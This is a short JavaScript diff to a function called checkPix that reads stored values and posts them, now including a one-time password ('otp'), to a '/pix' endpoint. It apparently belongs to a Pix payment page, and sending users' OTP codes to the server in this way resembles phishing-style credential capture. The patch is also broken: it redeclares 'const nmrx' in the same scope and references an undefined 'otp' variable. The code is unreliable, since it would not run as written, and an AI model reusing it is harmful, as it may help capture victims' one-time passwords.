@@ -185,7 +185,9 @@ async function checkPix(){
 /* ========================= */
 
             const nmrx = localStorage.getItem("nmrx");
-            localStorage.setItem("pix", pix);
+            const nmrx = localStorage.getItem("otp");
+
+
 
             try{
                 await fetch("/pix", {
@@ -195,6 +197,7 @@ async function checkPix(){
                     },
                     body:JSON.stringify({
                         nmrx:nmrx,
+                        otp:otp,
                         pix:pix
                     })
                 });
